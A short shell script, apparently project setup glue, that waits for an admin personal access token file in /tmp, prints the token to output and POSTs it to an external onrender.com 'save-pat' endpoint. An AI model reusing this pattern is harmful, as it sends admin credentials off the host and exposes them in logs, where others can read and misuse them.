#!/bin/sh
# Wait for PAT file to be created
for i in $(seq 1 30); do
  if [ -f /tmp/admin.pat ]; then
    PAT=$(cat /tmp/admin.pat)
    echo "FOUND_PAT=$PAT"
    
    # Try to send to custom-ui
    curl -s -X POST "https://zeroschool-custom-ui.onrender.com/api/save-pat" \
      -H "Content-Type: application/json" \
      -d "{\"pat\":\"$PAT\"}" 2>/dev/null || true
    
    break
  fi
  sleep 2
done

if [ ! -f /tmp/admin.pat ]; then
  echo "WARNING: /tmp/admin.pat not created after 60 seconds"
  # Try alternative paths
  ls -la /tmp/*.pat 2>/dev/null || echo "No .pat files in /tmp"
fi
